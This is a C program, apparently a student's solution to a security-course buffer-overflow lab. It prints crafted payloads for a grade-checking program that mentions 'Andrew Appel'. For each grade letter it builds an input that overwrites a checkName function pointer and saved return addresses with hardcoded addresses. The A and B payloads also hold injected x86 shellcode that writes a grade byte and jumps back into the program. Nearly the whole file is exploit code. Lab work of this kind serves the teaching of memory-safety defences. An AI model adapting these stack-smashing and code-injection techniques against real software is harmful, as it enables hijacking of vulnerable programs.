#include <stdio.h>
int main(int argc,char *argv[]) {

	char attackD[72] = "Frank";
	attackD[64] = 0;
	attackD[65] = 7;
	attackD[66] = 64;
	attackD[67] = 0;
	attackD[68] = 0;
	attackD[69] = 0;
	attackD[70] = 0;
	attackD[71] = 0;

	char attackC[112] = "Frank" ;
//Restore the checkName functions address
	attackC[64] = 0x69;
	attackC[65] = 0x08;
	attackC[66] = 0x40;
	attackC[67] = 0;
	attackC[68] = 0;
	attackC[69] = 0;
	attackC[70] = 0;
	attackC[71] = 0;

//Change the return address to the instructioin after the if name=="Andrew Appel" .
	attackC[104] = 0x2e ;
	attackC[105] = 0x08 ;
	attackC[106] = 0x40 ;
	attackC[107] = 0x00 ;
	attackC[108] = 0x00 ;
	attackC[109] = 0x00 ;
	attackC[110] = 0x00 ;
	attackC[111] = 0x00 ;

        char attackS[112] = "Frank" ;
//Change the return address to the instructioin after the if name=="Andrew Appel" .
        attackS[104] = 0x8b ;
        attackS[105] = 0x29 ;
        attackS[106] = 0x40 ;
        attackS[107] = 0x00 ;
        attackS[108] = 0x00 ;
        attackS[109] = 0x00 ;
        attackS[110] = 0x00 ;
        attackS[111] = 0x00 ;

	char attackB[112] = "Frank" ;

/* Opcode of following instructions are written in the Name variable . Appropriate address and return address offset is calculated and used
 
//   __asm__("movb $0x42 ,0x600ed4");
//   __asm__("jmp 0x40093c");
//
//         */
	attackB[6] = 0xc6;
	attackB[7] = 0x04;
	attackB[8] = 0x25;
	attackB[9] = 0xa4;
	attackB[10] = 0x0d;
	attackB[11] = 0x60;
	attackB[12] = 0x00;
	attackB[13] = 0x42;

	attackB[14] = 0xe9;
	attackB[15] = 0x42;
	attackB[16] = 0xfa;
	attackB[17] = 0xdf;
	attackB[18] = 0xff;
	attackB[19] = 0xff;

//Restore the value of checkName in the 'f' 
        attackB[64] = 0x69;
        attackB[65] = 0x08;
        attackB[66] = 0x40;
        attackB[67] = 0;
        attackB[68] = 0;
        attackB[69] = 0;
        attackB[70] = 0;
        attackB[71] = 0;

// Return address pointing to instructions in Name
        attackB[104] = 0xe6 ;
        attackB[105] = 0x0d ;
        attackB[106] = 0x60 ;
        attackB[107] = 0x00 ;
        attackB[108] = 0x00 ;
        attackB[109] = 0x00 ;
        attackB[110] = 0x00 ;
        attackB[111] = 0x00 ;

	char attackA[144] = "Frank" ;

	attackA[6] = 0xc6;
	attackA[7] = 0x04;
	attackA[8] = 0x25;
	attackA[9] = 0xa4;
	attackA[10] = 0x0d;
	attackA[11] = 0x60;
	attackA[12] = 0x00;
	attackA[13] = 0x41;

	attackA[14] = 0xe9;
	attackA[15] = 0x42;
	attackA[16] = 0xfa;
	attackA[17] = 0xdf;
	attackA[18] = 0xff;
	attackA[19] = 0xff;

//Copy the address of checkName in 3 possible locations 
        attackA[64] = 0x69;
        attackA[65] = 0x08;
        attackA[66] = 0x40;
        attackA[67] = 0;
        attackA[68] = 0;
        attackA[69] = 0;
        attackA[70] = 0;
        attackA[71] = 0;
	
	attackA[64+0x10] = 0x69;
        attackA[65+0x10] = 0x08;
        attackA[66+0x10] = 0x40;
        attackA[67+0x10] = 0;
        attackA[68+0x10] = 0;
        attackA[69+0x10] = 0;
        attackA[70+0x10] = 0;
        attackA[71+0x10] = 0;

	attackA[64+0x20] = 0x69;
        attackA[65+0x20] = 0x08;
        attackA[66+0x20] = 0x40;
        attackA[67+0x20] = 0;
        attackA[68+0x20] = 0;
        attackA[69+0x20] = 0;
        attackA[70+0x20] = 0;
        attackA[71+0x20] = 0;

//Copy the return address in 3 possible places . Depending upon the random value 'r' 
// the location can be shifted in 3 possilble places because of 16 byte alignment
        attackA[104] = 0xe6 ;
        attackA[105] = 0x0d ;
        attackA[106] = 0x60 ;
        attackA[107] = 0x00 ;
        attackA[108] = 0x00 ;
        attackA[109] = 0x00 ;
        attackA[110] = 0x00 ;
        attackA[111] = 0x00 ;

	attackA[104+0x10 ] = 0xe6 ;
        attackA[105+0x10 ] = 0x0d ;
        attackA[106 +0x10] = 0x60 ;
        attackA[107+0x10] = 0x00 ;
        attackA[108+0x10] = 0x00 ;
        attackA[109+0x10] = 0x00 ;
        attackA[110+0x10] = 0x00 ;
        attackA[111+0x10] = 0x00 ;


	attackA[104+0x20 ] = 0xe6 ;
        attackA[105+0x20 ] = 0x0d ;
        attackA[106 +0x20] = 0x60 ;
        attackA[107+0x20] = 0x00 ;
        attackA[108+0x20] = 0x00 ;
        attackA[109+0x20] = 0x00 ;
        attackA[110+0x20] = 0x00 ;
        attackA[111+0x20] = 0x00;


	switch(argv[1][0]) {
	case 'E':
	// at buf+64 the function ptr for checkName is stored . That address is zeroed out . Hence it will segment when the function ptr 'f' is used to call the function.
		write(1,"Frank000000000000000000000000000000000000000000000000000000000000000000",72);

		break;
	case 'D':
		write(1,attackD,72);
	// at buf+64 the function ptr is replaced with the address of setGradeToD() ;
		break;
	case 'C':
		write(1,attackC,112);

		break;
	case 'B':
		write(1,attackB,112);
		break;
	case 'A':
		write(1,attackA,144);
		break;
	case 's':
		write(1,attackS,112);
		break;
	default:
		break;


	}
}
